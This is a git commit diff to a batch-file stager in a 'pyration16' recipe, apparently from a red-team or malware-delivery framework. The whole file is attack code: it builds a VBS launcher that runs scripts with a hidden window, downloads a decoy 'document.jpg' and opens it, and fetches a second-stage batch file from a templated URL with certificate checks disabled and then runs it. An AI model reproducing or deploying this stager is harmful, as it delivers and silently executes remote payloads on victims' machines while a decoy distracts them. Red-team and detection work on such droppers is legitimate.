6032cffb93ec929a32e98dd4cee1dc417184b501
Dobin <dobin@broken.ch>
2023-02-25 12:17:32 +0100

    fix: pyration16 vbs stager

--- recipes/pyration16/stage1.bat
+++ recipes/pyration16/stage1.bat
@@ -1,5 +1,5 @@
-REM @echo off
-echo CreateObject^("Wscript.Shell"^).Run ^& WScript.Arguments^(0^) ^&, 0, False > "%tmp%/inv.vbs"
+@echo off
+echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """", 0, False > "%tmp%/inv.vbs"
 (echo if not exist "%tmp%/document.jpg" ^(curl -k "{{picUrl}}" -o "%tmp%/document.jpg" ^) & echo "%tmp%/document.jpg") > "%tmp%/settings.bat"
 (echo curl -k "{{batUrl}}" -o "%tmp%/c.bat" & echo call "%tmp%/c.bat") > "%tmp%/b.bat"
 wscript.exe "%tmp%/inv.vbs" "%tmp%/settings.bat" 
